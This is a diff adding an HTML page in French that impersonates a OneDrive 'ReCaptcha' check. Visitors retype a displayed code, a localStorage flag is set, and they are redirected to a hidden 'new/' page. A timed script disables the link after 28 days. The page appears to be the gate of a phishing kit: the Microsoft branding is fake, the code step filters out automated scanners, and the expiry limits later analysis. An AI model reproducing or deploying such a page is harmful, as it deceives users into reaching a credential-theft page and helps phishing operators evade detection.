@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vérification ReCaptcha</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      background: linear-gradient(to bottom right, #e9f0fc, #ffffff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      background-color: white;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+    }
+    .logo {
+      color: #0078d4;
+      font-weight: bold;
+      margin-bottom: 1rem;
+      font-size: 1.4rem;
+    }
+    .title {
+      font-size: 1.2rem;
+      font-weight: bold;
+      margin-bottom: 1rem;
+    }
+    .code-box {
+      font-size: 1.8rem;
+      letter-spacing: 0.5rem;
+      font-weight: bold;
+      margin: 1rem 0;
+      padding: 0.5rem;
+      background-color: #f0f0f0;
+      border-radius: 6px;
+      user-select: none;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 0.6rem;
+      margin-top: 0.5rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    button {
+      width: 100%;
+      padding: 0.7rem;
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      margin-top: 1rem;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #005fa3;
+    }
+    .error {
+      color: red;
+      margin-top: 0.5rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">OneDrive</div>
+    <div class="title">Veuillez confirmer que vous n'êtes pas un robot</div>
+    <div class="code-box" id="captchaCode">123456</div>
+    <input type="text" id="userInput" placeholder="Entrez le code affiché">
+    <button onclick="verifyCode()">Continuer</button>
+    <div class="error" id="errorMsg"></div>
+  </div>
+
+  <script>
+    function generateCode() {
+      return Math.floor(100000 + Math.random() * 900000).toString();
+    }
+
+    const captchaCode = generateCode();
+    document.getElementById("captchaCode").textContent = captchaCode;
+
+    function verifyCode() {
+      const input = document.getElementById("userInput").value;
+      const errorDiv = document.getElementById("errorMsg");
+      if (input === captchaCode) {
+	  localStorage.setItem("valide","true");
+        window.location.href = "new/"; // Remplacez par l'URL réelle
+      } else {
+        errorDiv.textContent = "Code incorrect. Veuillez réessayer.";
+      }
+    }
+  </script>
+  <script>
+const startDate = new Date('2025-07-10T00:00:00');
+const expirationDays = 28;
+
+function isLinkExpired() {
+  const now = new Date();
+  const timeDiff = now - startDate;
+  const daysPassed = timeDiff / (1000 * 60 * 60 * 24);
+  return daysPassed >= expirationDays;
+}
+
+function showExpirationMessage() {
+  if (isLinkExpired()) {
+    document.body.innerHTML = '';
+    const messageDiv = document.createElement('div');
+    messageDiv.innerHTML = `
+      <h1>⚠️ Le lien a expiré</h1>
+      <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
+    `;
+    Object.assign(messageDiv.style, {
+      position: 'fixed',
+      top: '0',
+      left: '0',
+      width: '100vw',
+      height: '100vh',
+      display: 'flex',
+      flexDirection: 'column',
+      justifyContent: 'center',
+      alignItems: 'center',
+      backgroundColor: '#1a1a1a',
+      color: '#ff4d4f',
+      fontFamily: 'Segoe UI, Arial, sans-serif',
+      fontSize: '24px',
+      textAlign: 'center',
+      padding: '40px',
+      boxSizing: 'border-box',
+      zIndex: '9999',
+    });
+    messageDiv.querySelector('h1').style.fontSize = '36px';
+    messageDiv.querySelector('h1').style.marginBottom = '20px';
+    messageDiv.querySelector('p').style.color = '#ffffff';
+    document.body.appendChild(messageDiv);
+  }
+}
+
+window.onload = showExpirationMessage;
+</script>
+</body>
+</html>
